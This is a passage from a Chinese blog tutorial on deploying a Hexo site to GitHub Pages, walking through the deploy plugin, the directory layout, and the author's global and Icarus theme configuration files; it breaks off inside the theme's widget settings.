class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></p><p>完成后就可以部署到Github了，使用下面的命令：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></p><p>到这部署配置就完成……</p><p>这时，你就可以在任意联网设备上打开你的博客咯，</p><p><a href="https://yourname.github.io（非此链接）" target="_blank" rel="noopener">https://yourname.github.io（非此链接）</a></p><h4 id="4-其他"><a href="#4-其他" class="headerlink" title="4. 其他"></a>4. 其他</h4><p><strong>hexo目录结构</strong><br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|-- _config.yml  <span class="hljs-comment"># 全局配置文件</span></span><br><span class="line">|-- package.json <span class="hljs-comment"># hexo框架的参数和所依赖插件</span></span><br><span class="line">|-- scaffolds    <span class="hljs-comment"># 骨架，基本不用关心</span></span><br><span class="line">|-- <span class="hljs-built_in">source</span>       <span class="hljs-comment"># 很重要的一个目录，里面存放文章和图片……</span></span><br><span class="line">   |-- _posts    <span class="hljs-comment"># 放置文章的目录</span></span><br><span class="line">|-- themes</span><br><span class="line">   |-- landscape        <span class="hljs-comment"># 默认主题</span></span><br><span class="line">   |-- hexo-theme-next  <span class="hljs-comment"># 第三方主题</span></span><br><span class="line">|-- .gitignore   <span class="hljs-comment"># 不用管</span></span><br></pre></td></tr></table></figure></p><p><strong>关于配置</strong>，可参考<a href="https://fanqxu.com">我的博客</a>的_config.yml配置</p><p>建议这个和实际网页对比着看……</p><p>其中有两份配置文件，一个是博客根目录的全局配置文件；还有一个就主题目录(themes)下的主题配置文件。</p><p>首先是全局配置</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># Hexo Configuration</span></span><br><span class="line"><span class="hljs-comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="hljs-comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Site</span></span><br><span class="line"><span class="hljs-attr">title:</span> <span class="hljs-string">FanqXu'Blog</span> <span class="hljs-comment"># 博客名</span></span><br><span class="line"><span class="hljs-attr">subtitle:</span> <span class="hljs-string">Simple,</span> <span class="hljs-literal">No</span> <span class="hljs-literal">No</span> <span class="hljs-literal">No</span><span class="hljs-string">,</span> <span class="hljs-string">Is</span> <span class="hljs-literal">No</span> <span class="hljs-string">Simple.</span> <span class="hljs-comment"># 下方的一句话</span></span><br><span class="line"><span class="hljs-attr">author:</span> <span class="hljs-string">FanqXu</span>     <span class="hljs-comment"># 你名字</span></span><br><span class="line"><span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span>    <span class="hljs-comment"># 中文</span></span><br><span class="line"><span class="hljs-attr">timezone:</span>          <span class="hljs-comment"># 时区，此处不填写，默认本地时区</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># URL 暂不作配置</span></span><br><span class="line"><span class="hljs-comment">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></span><br><span class="line"><span class="hljs-attr">url:</span> <span class="hljs-attr">https://fanqxu.com</span>    <span class="hljs-comment"># 你的网站域名 Note: don't forget to modify the CNAME file to your url</span></span><br><span class="line"><span class="hljs-attr">root:</span> <span class="hljs-string">/</span></span><br><span class="line"><span class="hljs-attr">permalink:</span> <span class="hljs-string">:year/:month/:day/:title/</span>  <span class="hljs-comment"># 年/月/日</span></span><br><span class="line"><span class="hljs-attr">permalink_defaults:</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Site settings</span></span><br><span class="line"><span class="hljs-attr">SEOTitle:</span> <span class="hljs-string">FanqXu</span> <span class="hljs-string">| FanqXu'Blog    # 浏览器上方标签栏显示文字</span></span><br><span class="line"><span class="hljs-string"></span><span class="hljs-attr">email:</span> <span class="hljs-string">expertxiao@gmail.com</span> <span class="hljs-comment"># 你的email</span></span><br><span class="line"><span class="hljs-attr">description:</span> <span class="hljs-string">"Here is a record of my study and some SAO operation!!!"</span> <span class="hljs-comment"># 描述</span></span><br><span class="line"><span class="hljs-attr">keyword:</span> <span class="hljs-string">" "</span>   <span class="hljs-comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Build settings</span></span><br><span class="line"><span class="hljs-attr">anchorjs:</span> <span class="hljs-literal">true</span>                          <span class="hljs-comment"># if you want to customize anchor. check out line:181 of `post.html`</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Sidebar settings</span></span><br><span class="line"><span class="hljs-attr">sidebar:</span> <span class="hljs-literal">true</span>                       <span class="hljs-comment"># whether or not using Sidebar.</span></span><br><span class="line"><span class="hljs-attr">sidebar-about-description:</span> <span class="hljs-string">"Hi, I'm FanqXu."</span></span><br><span class="line"><span class="hljs-attr">sidebar-avatar:</span> <span class="hljs-string">img/mountietocat.png</span>      <span class="hljs-comment"># use absolute URL, seeing it's used in both `/` and `/about/`</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># widget behavior</span></span><br><span class="line"><span class="hljs-comment">## Archive</span></span><br><span class="line"><span class="hljs-attr">archive_type:</span> <span class="hljs-string">'monthly'</span></span><br><span class="line"><span class="hljs-attr">show_count:</span> <span class="hljs-literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Directory 暂不配置，使用默认值</span></span><br><span class="line"><span class="hljs-attr">source_dir:</span> <span class="hljs-string">source</span></span><br><span class="line"><span class="hljs-attr">public_dir:</span> <span class="hljs-string">public</span></span><br><span class="line"><span class="hljs-attr">tag_dir:</span> <span class="hljs-string">tags</span></span><br><span class="line"><span class="hljs-attr">archive_dir:</span> <span class="hljs-string">archives</span></span><br><span class="line"><span class="hljs-attr">category_dir:</span> <span class="hljs-string">categories</span></span><br><span class="line"><span class="hljs-attr">code_dir:</span> <span class="hljs-string">downloads/code</span></span><br><span class="line"><span class="hljs-attr">i18n_dir:</span> <span class="hljs-string">:lang</span></span><br><span class="line"><span class="hljs-attr">skip_render:</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Writing  文章布局等，使用默认值</span></span><br><span class="line"><span class="hljs-attr">new_post_name:</span> <span class="hljs-string">:title.md</span> <span class="hljs-comment"># File name of new posts</span></span><br><span class="line"><span class="hljs-attr">default_layout:</span> <span class="hljs-string">post</span></span><br><span class="line"><span class="hljs-attr">titlecase:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># Transform title into titlecase</span></span><br><span class="line"><span class="hljs-attr">external_link:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># Open external links in new tab</span></span><br><span class="line"><span class="hljs-attr">filename_case:</span> <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attr">render_drafts:</span> <span class="hljs-literal">false</span></span><br><span class="line"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">relative_link:</span> <span class="hljs-literal">false</span></span><br><span class="line"><span class="hljs-attr">future:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">highlight:</span></span><br><span class="line"><span class="hljs-attr">  enable:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">  line_number:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">  auto_detect:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">  tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Category &amp; Tag  使用默认</span></span><br><span class="line"><span class="hljs-attr">default_category:</span> <span class="hljs-string">uncategorized</span></span><br><span class="line"><span class="hljs-attr">category_map:</span></span><br><span class="line"><span class="hljs-attr">tag_map:</span></span><br><span class="line"><span class="hljs-attr">home_posts_tag:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># show posts tags</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Date / Time format 默认</span></span><br><span class="line"><span class="hljs-comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="hljs-comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="hljs-comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="hljs-attr">date_format:</span> <span class="hljs-string">YYYY-MM-DD</span></span><br><span class="line"><span class="hljs-attr">time_format:</span> <span class="hljs-attr">HH:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Pagination</span></span><br><span class="line"><span class="hljs-comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="hljs-attr">per_page:</span> <span class="hljs-number">10</span>   <span class="hljs-comment"># 每一页显示的文章数</span></span><br><span class="line"><span class="hljs-attr">pagination_dir:</span> <span class="hljs-string">archives</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">archive_generator:</span></span><br><span class="line"><span class="hljs-attr">  per_page:</span> <span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-attr">  yearly:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">  monthly:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">  daily:</span> <span class="hljs-literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Markdown-it config 默认</span></span><br><span class="line"><span class="hljs-comment">## Docs: https://github.com/celsomiranda/hexo-renderer-markdown-it/wiki</span></span><br><span class="line"><span class="hljs-attr">markdown:</span></span><br><span class="line"><span class="hljs-attr">  render:</span></span><br><span class="line"><span class="hljs-attr">    html:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">    xhtmlOut:</span> <span class="hljs-literal">false</span></span><br><span class="line"><span class="hljs-attr">    breaks:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">    linkify:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">    typographer:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">    quotes:</span> <span class="hljs-string">'“”‘’'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="hljs-attr">theme:</span> <span class="hljs-string">icarus</span>  <span class="hljs-comment"># 放在themes目录下的主题</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">#sitemap</span></span><br><span class="line"><span class="hljs-attr">sitemap:</span></span><br><span class="line"><span class="hljs-attr">  path:</span> <span class="hljs-string">sitemap.xml</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Deployment   用于部署到github</span></span><br><span class="line"><span class="hljs-comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="hljs-attr">deploy:</span></span><br><span class="line"><span class="hljs-attr">  type:</span> <span class="hljs-string">git</span>        <span class="hljs-comment"># git提交</span></span><br><span class="line"><span class="hljs-attr">  repository:</span> <span class="hljs-string">git@github.com:fanqxu/fanqxu.github.io.git</span>  <span class="hljs-comment"># 这里的fanqxu应是你的Github用户名</span></span><br><span class="line"><span class="hljs-attr">  branch:</span> <span class="hljs-string">master</span>   <span class="hljs-comment"># 就写master</span></span><br></pre></td></tr></table></figure><p>重要的就是主题配置文件(Update by 2019.01.08)</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># Version of the Icarus theme that is currently used</span></span><br><span class="line"><span class="hljs-attr">version:</span> <span class="hljs-number">2.3</span><span class="hljs-number">.0</span></span><br><span class="line"><span class="hljs-comment"># Path or URL to the website's icon</span></span><br><span class="line"><span class="hljs-attr">favicon:</span> <span class="hljs-string">/images/favicon.ico</span></span><br><span class="line"><span class="hljs-comment"># Path or URL to RSS atom.xml</span></span><br><span class="line"><span class="hljs-attr">rss:</span></span><br><span class="line"><span class="hljs-comment"># Path or URL to the website's logo to be shown on the left of the navigation bar or footer</span></span><br><span class="line"><span class="hljs-attr">logo:</span> <span class="hljs-string">/images/logo.gif</span></span><br><span class="line"><span class="hljs-comment"># Open Graph metadata</span></span><br><span class="line"><span class="hljs-comment"># https://hexo.io/docs/helpers.html#open-graph</span></span><br><span class="line"><span class="hljs-attr">open_graph:</span></span><br><span class="line">    <span class="hljs-comment"># Facebook App ID</span></span><br><span class="line"><span class="hljs-attr">    fb_app_id:</span></span><br><span class="line">    <span class="hljs-comment"># Facebook Admin ID</span></span><br><span class="line"><span class="hljs-attr">    fb_admins:</span></span><br><span class="line">    <span class="hljs-comment"># Twitter ID</span></span><br><span class="line"><span class="hljs-attr">    twitter_id:</span></span><br><span class="line">    <span class="hljs-comment"># Twitter site</span></span><br><span class="line"><span class="hljs-attr">    twitter_site:</span> <span class="hljs-string">Expert</span></span><br><span class="line">    <span class="hljs-comment"># Google+ profile link</span></span><br><span class="line">    <span class="hljs-comment">#google_plus:</span></span><br><span class="line"><span class="hljs-comment"># Navigation bar link settings</span></span><br><span class="line"><span class="hljs-attr">navbar:</span></span><br><span class="line">    <span class="hljs-comment"># Navigation bar menu links</span></span><br><span class="line"><span class="hljs-attr">    menu:</span></span><br><span class="line"><span class="hljs-attr">        Home:</span> <span class="hljs-string">/</span></span><br><span class="line"><span class="hljs-attr">        Archives:</span> <span class="hljs-string">/archives</span></span><br><span class="line"><span class="hljs-attr">        Categories:</span> <span class="hljs-string">/categories</span></span><br><span class="line"><span class="hljs-attr">        Tags:</span> <span class="hljs-string">/tags</span></span><br><span class="line"><span class="hljs-attr">        About:</span> <span class="hljs-string">/about</span></span><br><span class="line">    <span class="hljs-comment"># Navigation bar links to be shown on the right</span></span><br><span class="line">    <span class="hljs-comment">#links:</span></span><br><span class="line">    <span class="hljs-comment">#   Download on GitHub:</span></span><br><span class="line">    <span class="hljs-comment">#        icon: fab fa-github</span></span><br><span class="line">    <span class="hljs-comment">#        url: 'http://github.com/ppoffice/hexo-theme-icarus'</span></span><br><span class="line"><span class="hljs-comment"># Footer section link settings</span></span><br><span class="line"><span class="hljs-attr">footer:</span></span><br><span class="line">    <span class="hljs-comment"># Links to be shown on the right of the footer section</span></span><br><span class="line"><span class="hljs-attr">    links:</span></span><br><span class="line">        <span class="hljs-string">Creative</span> <span class="hljs-attr">Commons:</span></span><br><span class="line"><span class="hljs-attr">            icon:</span> <span class="hljs-string">fab</span> <span class="hljs-string">fa-creative-commons</span></span><br><span class="line"><span class="hljs-attr">            url:</span> <span class="hljs-string">'https://creativecommons.org/'</span></span><br><span class="line">        <span class="hljs-string">Attribution</span> <span class="hljs-number">4.0</span> <span class="hljs-attr">International:</span></span><br><span class="line"><span class="hljs-attr">            icon:</span> <span class="hljs-string">fab</span> <span class="hljs-string">fa-creative-commons-by</span></span><br><span class="line"><span class="hljs-attr">            url:</span> <span class="hljs-string">'https://creativecommons.org/licenses/by/4.0/'</span></span><br><span class="line">        <span class="hljs-comment">#Download on GitHub:</span></span><br><span class="line">        <span class="hljs-comment">#    icon: fab fa-github</span></span><br><span class="line">        <span class="hljs-comment">#    url: 'http://github.com/ppoffice/hexo-theme-icarus'</span></span><br><span class="line"><span class="hljs-comment"># Article display settings</span></span><br><span class="line"><span class="hljs-attr">article:</span></span><br><span class="line">    <span class="hljs-comment"># Code highlight theme</span></span><br><span class="line">    <span class="hljs-comment"># https://github.com/highlightjs/highlight.js/tree/master/src/styles</span></span><br><span class="line"><span class="hljs-attr">    highlight:</span> <span class="hljs-string">atom-one-light</span></span><br><span class="line">    <span class="hljs-comment"># Whether to show article thumbnail images</span></span><br><span class="line"><span class="hljs-attr">    thumbnail:</span> <span class="hljs-literal">true</span></span><br><span class="line">    <span class="hljs-comment"># Whether to show estimate article reading time</span></span><br><span class="line"><span class="hljs-attr">    readtime:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-comment"># Search plugin settings</span></span><br><span class="line"><span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/categories/Configuration/Search-Plugins</span></span><br><span class="line"><span class="hljs-attr">search:</span></span><br><span class="line">    <span class="hljs-comment"># Name of the search plugin</span></span><br><span class="line"><span class="hljs-attr">    type:</span> <span class="hljs-string">insight</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Comment plugin settings</span></span><br><span class="line"><span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/categories/Configuration/Comment-Plugins</span></span><br><span class="line"><span class="hljs-attr">comment:</span></span><br><span class="line">    <span class="hljs-comment"># Name of the comment plugin</span></span><br><span class="line"><span class="hljs-attr">    type:</span> <span class="hljs-string">valine</span></span><br><span class="line"><span class="hljs-attr">    app_id:</span> <span class="hljs-string">sr3jdB7UEto7mridvIc0wVsa-gzGzoHsz</span></span><br><span class="line"><span class="hljs-attr">    app_key:</span> <span class="hljs-string">XhGF68GD6Pz8U5XewWhjcL8j</span></span><br><span class="line"><span class="hljs-attr">    notify:</span> <span class="hljs-literal">true</span></span><br><span class="line"><span class="hljs-attr">    verify:</span> <span class="hljs-literal">false</span></span><br><span class="line"><span class="hljs-attr">    placeholder:</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Donation entries</span></span><br><span class="line"><span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/categories/Donation/</span></span><br><span class="line"><span class="hljs-attr">donate:</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Donation entry name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">alipay</span></span><br><span class="line">        <span class="hljs-comment"># Qrcode image URL</span></span><br><span class="line"><span class="hljs-attr">        qrcode:</span> <span class="hljs-string">'/images/alipay.jpg'</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Donation entry name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">wechat</span></span><br><span class="line">        <span class="hljs-comment"># Qrcode image URL</span></span><br><span class="line"><span class="hljs-attr">        qrcode:</span> <span class="hljs-string">'/images/wechat.png'</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Donation entry name</span></span><br><span class="line">        <span class="hljs-comment"># type: paypal</span></span><br><span class="line">        <span class="hljs-comment"># Paypal business ID or email address</span></span><br><span class="line">        <span class="hljs-comment">#business: ''</span></span><br><span class="line">        <span class="hljs-comment"># Currency code</span></span><br><span class="line">        <span class="hljs-comment">#currency_code: USD</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Donation entry name</span></span><br><span class="line">        <span class="hljs-comment">#type: patreon</span></span><br><span class="line">        <span class="hljs-comment"># URL to the Patreon page</span></span><br><span class="line">        <span class="hljs-comment">#url: ''</span></span><br><span class="line"><span class="hljs-comment"># Share plugin settings</span></span><br><span class="line"><span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/categories/Configuration/Share-Plugins</span></span><br><span class="line"><span class="hljs-comment">#ishare: addtoany</span></span><br><span class="line">    <span class="hljs-comment"># Share plugin name</span></span><br><span class="line"><span class="hljs-comment">#    type:</span></span><br><span class="line"><span class="hljs-comment"># Sidebar settings.</span></span><br><span class="line"><span class="hljs-comment"># Please be noted that a sidebar is only visible when it has at least one widget</span></span><br><span class="line"><span class="hljs-attr">sidebar:</span></span><br><span class="line">    <span class="hljs-comment"># left sidebar settings</span></span><br><span class="line"><span class="hljs-attr">    left:</span></span><br><span class="line">        <span class="hljs-comment"># Whether the left sidebar is sticky when page scrolls</span></span><br><span class="line">        <span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Configuration/Theme/make-a-sidebar-sticky-when-page-scrolls/</span></span><br><span class="line"><span class="hljs-attr">        sticky:</span> <span class="hljs-literal">true</span></span><br><span class="line">    <span class="hljs-comment"># right sidebar settings</span></span><br><span class="line"><span class="hljs-attr">    right:</span></span><br><span class="line">        <span class="hljs-comment"># Whether the right sidebar is sticky when page scrolls</span></span><br><span class="line">        <span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/Configuration/Theme/make-a-sidebar-sticky-when-page-scrolls/</span></span><br><span class="line"><span class="hljs-attr">        sticky:</span> <span class="hljs-literal">false</span></span><br><span class="line"><span class="hljs-comment"># Sidebar widget settings█</span></span><br><span class="line"><span class="hljs-comment"># http://ppoffice.github.io/hexo-theme-icarus/categories/Widgets/</span></span><br><span class="line"><span class="hljs-attr">widgets:</span></span><br><span class="line"><span class="hljs-bullet">    -</span></span><br><span class="line">        <span class="hljs-comment"># Widget name</span></span><br><span class="line"><span class="hljs-attr">        type:</span> <span class="hljs-string">profile</span></span><br><span class="line">        <span class="hljs-comment"># Where should the widget be placed, left or right</span></span><br><span class="line"><span class="hljs-attr">        position:</span> <span class="hljs-string">left</span></span><br><span class="line">        <span class="hljs-comment"># Author name to be shown in the profile widget</span></span><br><span class="line"><span class="hljs-attr">        author:</span> <span class="hljs-string">FanqXu</span></span><br><span class="line">        <span class="hljs-comment"># Title of the author to be shown in the profile widget</span></span><br><span class="line"><span class="hljs-attr">        author_title:</span> <span class="hljs-string">瞎鸡掰写，胡乱造</span></span><br><span class="line">        <span class="hljs-comment"># Author's current location to be shown in the profile widget</span></span><br><span class="line"><span class="hljs-attr">        location:</span> <span class="hljs-string">Wuhan,China</span></span><br><span class="line">        <span class="hljs-comment"># Path or URL to the avatar to be shown in the profile widget</span></span><br><span class="line"><span class="hljs-attr">        avatar:</span> <span class="hljs-string">/images/avatar.png</span></span><br><span class="line">        <span class="hljs-comment"># Email address for the Gravatar to be shown in the profile widget</span></span><br><span class="line">        <span class="hljs-comment">#gravatar:</span></span><br><span class="line">        <span class="hljs-comment"># Path or URL for the follow button</span></span><br><span class="line"><span class="hljs-attr">        follow_link:</span> <span class="hljs-string">'http://github.com/FanqXu'</span></span><br><span class="line">        <span class="hljs-comment"># 